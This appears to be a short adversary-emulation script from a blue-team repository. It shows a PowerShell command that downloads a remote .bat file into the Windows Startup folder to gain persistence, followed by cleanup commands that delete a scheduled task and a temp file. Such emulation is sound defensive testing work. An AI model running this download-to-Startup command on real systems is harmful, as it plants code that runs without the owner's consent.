powershell.exe -c Invoke-WebRequest -uri "https://github.com/LeMagicKonch/BlueTeamOps/raw/refs/heads/main/Adversary%20Emulation/startCalc.bat" -OutFile "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\startupPersistance.bat"

# Delete Scheduled Task
# TODO
# schtasks /DELETE /TN updater /F

:: Delete C:\Windows\Temp\test.bat
Remove-Item -Path "C:\Windows\Temp\test.bat"
